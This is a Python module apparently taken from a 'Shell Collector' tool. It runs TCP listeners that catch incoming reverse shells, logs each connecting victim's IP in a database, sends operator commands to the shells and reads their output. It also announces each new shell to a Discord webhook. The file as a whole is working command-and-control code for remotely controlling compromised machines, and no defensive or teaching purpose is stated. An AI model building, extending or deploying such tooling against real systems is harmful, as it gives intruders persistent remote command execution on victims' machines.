import json
import socket
import threading
import urllib.request
from datetime import datetime

from .database import ShellClient as ShellClientModel, Listener as ListenerModel, Setting

class Shell:
    def __init__(self, shell_id, sock, addr):
        self.shell_id = shell_id
        self.sock = sock
        self.addr = addr
        self.running = True
        self.output_buffer = bytearray()
        self.lock = threading.Lock()
        self.reader_thread = threading.Thread(target=self._reader, daemon=True)
        self.reader_thread.start()

    def _reader(self):
        self.sock.settimeout(1.0)
        while self.running:
            try:
                data = self.sock.recv(4096)
                if not data:
                    break
                with self.lock:
                    self.output_buffer.extend(data)
            except socket.timeout:
                continue
            except Exception:
                break
        self.running = False

    def send_command(self, command):
        try:
            self.sock.sendall((command + '\n').encode())
        except Exception:
            self.running = False
            raise

    def get_output(self, since=0):
        with self.lock:
            length = len(self.output_buffer)
            output = bytes(self.output_buffer[since:])
        return output, length

    def close(self):
        self.running = False
        try:
            self.sock.close()
        except Exception:
            pass

class ListenerServer:
    def __init__(self, listener_id, address, port):
        self.listener_id = listener_id
        self.address = address
        self.port = port
        self.server_sock = None
        self.running = False
        self.thread = None
        self.on_accept = None

    def start(self):
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind((self.address, self.port))
        self.server_sock.listen(5)
        self.server_sock.settimeout(1.0)
        self.running = True
        self.thread = threading.Thread(target=self._accept, daemon=True)
        self.thread.start()

    def _accept(self):
        while self.running:
            try:
                client, addr = self.server_sock.accept()
                if self.on_accept:
                    self.on_accept(self.listener_id, client, addr)
            except socket.timeout:
                continue
            except Exception:
                break
        self.running = False

    def stop(self):
        self.running = False
        try:
            self.server_sock.close()
        except Exception:
            pass

class ShellManager:
    def __init__(self):
        self.listeners = {}
        self.shells = {}
        self.shells_lock = threading.Lock()

    def _send_discord_webhook(self, ip, port, listener_id, shell_id):
        try:
            setting = Setting.get_or_none(Setting.key == 'discord_webhook_url')
            if not setting or not setting.value:
                return
            url = setting.value
            embed = {
                'embeds': [{
                    'title': 'New Shell Connection',
                    'color': 0xdd0606,
                    'fields': [
                        {'name': 'IP Address', 'value': ip, 'inline': True},
                        {'name': 'Port', 'value': str(port), 'inline': True},
                        {'name': 'Listener ID', 'value': str(listener_id), 'inline': True},
                        {'name': 'Shell ID', 'value': str(shell_id), 'inline': True},
                        {'name': 'Time', 'value': datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC'), 'inline': False},
                    ],
                    'footer': {'text': 'Shell Collector'},
                }]
            }
            data = json.dumps(embed).encode()
            req = urllib.request.Request(
                url, data=data,
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'ShellCollector/1.0',
                }
            )
            resp = urllib.request.urlopen(req, timeout=10)
            if resp.status != 204:
                print(f'Discord webhook returned status {resp.status}')
        except Exception as e:
            print(f'Discord webhook error: {e}')

    def start_listener(self, listener_id, address, port):
        listener = ListenerServer(listener_id, address, port)
        listener.on_accept = self._on_accept
        listener.start()
        self.listeners[listener_id] = listener

    def stop_listener(self, listener_id):
        listener = self.listeners.pop(listener_id, None)
        if listener:
            listener.stop()
            with self.shells_lock:
                to_remove = [sid for sid, s in self.shells.items()
                             if self._shell_belongs_to_listener(sid, listener_id)]
                for sid in to_remove:
                    shell = self.shells.pop(sid, None)
                    if shell:
                        shell.close()
                        self._mark_shell_disconnected(sid)

    def _shell_belongs_to_listener(self, shell_id, listener_id):
        try:
            sc = ShellClientModel.get_by_id(shell_id)
            return sc.listener_id == listener_id
        except ShellClientModel.DoesNotExist:
            return False

    def _on_accept(self, listener_id, client_sock, addr):
        ip = addr[0]
        try:
            listener_model = ListenerModel.get_by_id(listener_id)
            shell_client = ShellClientModel.create(
                listener=listener_model,
                user=listener_model.user,
                ip_address=ip,
                connected_at=datetime.now(),
                last_seen=datetime.now(),
                is_active=True
            )
            shell_id = shell_client.id
            shell = Shell(shell_id, client_sock, addr)
            with self.shells_lock:
                self.shells[shell_id] = shell
            self._send_discord_webhook(ip, listener_model.port, listener_id, shell_id)
        except Exception as e:
            try:
                client_sock.close()
            except Exception:
                pass

    def get_shell(self, shell_id):
        return self.shells.get(shell_id)

    def send_command(self, shell_id, command):
        shell = self.shells.get(shell_id)
        if not shell:
            return False
        try:
            shell.send_command(command)
            return True
        except Exception:
            self._cleanup_shell(shell_id)
            return False

    def get_output(self, shell_id, since=0):
        shell = self.shells.get(shell_id)
        if not shell:
            return None, None
        output, length = shell.get_output(since)
        if not shell.running:
            self._cleanup_shell(shell_id)
        else:
            try:
                ShellClientModel.update(
                    last_seen=datetime.now()
                ).where(ShellClientModel.id == shell_id).execute()
            except Exception:
                pass
        return output, length

    def disconnect_shell(self, shell_id):
        with self.shells_lock:
            shell = self.shells.pop(shell_id, None)
        if shell:
            shell.close()
        self._mark_shell_disconnected(shell_id)

    def _cleanup_shell(self, shell_id):
        with self.shells_lock:
            self.shells.pop(shell_id, None)
        self._mark_shell_disconnected(shell_id)

    def _mark_shell_disconnected(self, shell_id):
        try:
            ShellClientModel.update(
                is_active=False,
                last_seen=datetime.now()
            ).where(ShellClientModel.id == shell_id).execute()
        except Exception:
            pass
